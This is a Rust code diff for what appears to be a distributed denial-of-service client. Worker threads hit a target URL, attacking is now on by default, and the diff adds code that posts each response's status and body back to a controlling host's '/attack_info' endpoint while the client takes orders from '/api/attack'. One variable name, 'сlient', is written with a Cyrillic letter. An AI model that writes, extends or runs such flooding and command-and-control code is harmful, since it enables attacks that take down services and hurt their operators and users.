@@ -1,3 +1,4 @@
+use serde_json;
 use std::sync::{Arc, Mutex};
 
 struct Client {
@@ -10,20 +11,28 @@ struct Client {
 }
 
 struct Worker {
+    host_address: String,
     thread_no: usize,
     attacking: bool,
     address: String,
 }
 
 impl Worker {
-    fn new(addr: String, no:usize) -> Worker {
-        Worker { attacking: false, address: addr, thread_no: no}
+    fn new(addr: String, no:usize, host: String) -> Worker {
+        Worker {host_address: host, attacking: true, address: addr, thread_no: no}
     }
     fn start_requesting(&self) -> i32{
         if self.attacking {
-            println!("Thread {} is attacking", self.thread_no);
             let to_attack = self.address.as_str();
-            let _ = reqwest::blocking::get(to_attack);
+            let res = reqwest::blocking::get(to_attack).unwrap();
+            let code = res.status().as_u16();
+            let body = res.text().unwrap();
+            let сlient = reqwest::blocking::Client::new();
+            let mut addr = self.host_address.clone();
+            addr.push_str("/attack_info");
+            let response_body = serde_json::json!({"code": code, "body":body});
+            println!("{}", response_body);
+            let _ = сlient.post(addr.as_str()).json(&response_body).send().unwrap();
             return 0;
         }
     1
@@ -33,13 +42,13 @@ impl Worker {
 impl Client {
     fn new(host: String, addr: String) -> Client {
         let mut cl = Client { host_address: host, address: addr, attacking: false, workers: vec![], worker_threads: vec![] };
-        cl.host_address.push_str("/api/attack");
-        let thread_count = (std::thread::available_parallelism().unwrap().get())*4;
+        let thread_count = (std::thread::available_parallelism().unwrap().get());
         cl.worker_threads.reserve(thread_count);
         for i in 0..thread_count {
             cl.workers.push(Arc::new(Mutex::new(
-                Worker::new(cl.address.clone(), i.clone()))));
+                Worker::new(cl.address.clone(), i.clone(), cl.host_address.clone()))));
         }
+        cl.host_address.push_str("/api/attack");
         return cl;
     }
 
